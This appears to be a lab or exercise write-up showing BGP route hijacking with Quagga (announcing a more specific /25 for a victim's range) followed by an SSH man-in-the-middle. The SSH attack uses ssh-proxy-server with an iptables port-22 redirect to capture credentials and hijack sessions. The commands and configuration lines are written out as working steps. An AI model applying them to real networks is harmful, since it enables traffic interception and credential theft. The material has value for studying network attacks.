# BGP Spoofing & SSH MiTM
## Assumptions
* You are on a network with numerous systems advertising BGP routers.
* You have Quagga & BGPD installed and configured and are part of the network

## BGP Spoofing
![](https://i.imgur.com/ECNbaJT.png)
<br>In the above example I am connected to machine 10.1.0.1. 
<br>My target will be the machine on 10.45.0.1.

The first step in this process is to modify my own BGPD settings to insert the victim's IP address with a smaller CIDR.
<br>This is done by editing `/etc/quagga/bgpd.conf` and adding the following line `network 10.45.0.0/25` under my own.

![](https://i.imgur.com/hvMV0PX.png)

This was also done to `/etc/quagga/zebra.conf`. In this case `ip address` was modified to suit the intercepted IP on both interfaces.

![](https://i.imgur.com/MKvbivB.png)

I reset the BGP and Zebra services and the `ip route` now appeared as such:

![](https://i.imgur.com/qu8rOE9.png)

This meant that I was now intercepting all communication to and from 10.45.0.0/25.

![](https://i.imgur.com/91MSMEk.png)

If I looked at the routing from another machine, it is again confirmed.

## SSH MiTM

I first modified my default SSH port to 1337 and enabled this new port in my nftables. I cant exactly use my SSH while honeypotting it!

Using [ssh-proxy-server](https://pypi.org/project/ssh-proxy-server/) as mitm tool has the advantage to get the credentials, record full sessions and hijack the session.

I installed the honey pot with the following commands:

It is recommended to install the honey pot in a virtual python environment.
* python3 -m venv ~/vpython3
* source ~/vpython3/bin/activate

Intall ssh-proxy-server as mitm tool:

* pip install ssh-proxy-server
* ssh-keygen -t rsa -f ./ssh-honeypot.rsa

Redirect port 22 to 10022 (ssh-proxy-server default port):

* sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 10022

Start the mitm ssh proxy server:

* ssh-proxy-server --host-key ./ssh-honeypot.rsa --listen-address 0.0.0.0 --remote-host HONEY_POT_IP --remote-port 22 --auth-username HONEY_POT_USER --auth-password HONEY_POT_PASSWORD

It is also possible to pass the authentication to the honey pot server. To pass the client credentials to the server, you must not use the parameter "--auth-username" and "--auth-password".



When using the right plugnins in ssh-proxy-server, it is possible to monitor the session or hijack the session.

I could also add every single IP in the network to my Zebra and BGP configuration. This would force all IPs to connect through me. 

![](https://i.imgur.com/Oiqx2f2.png)



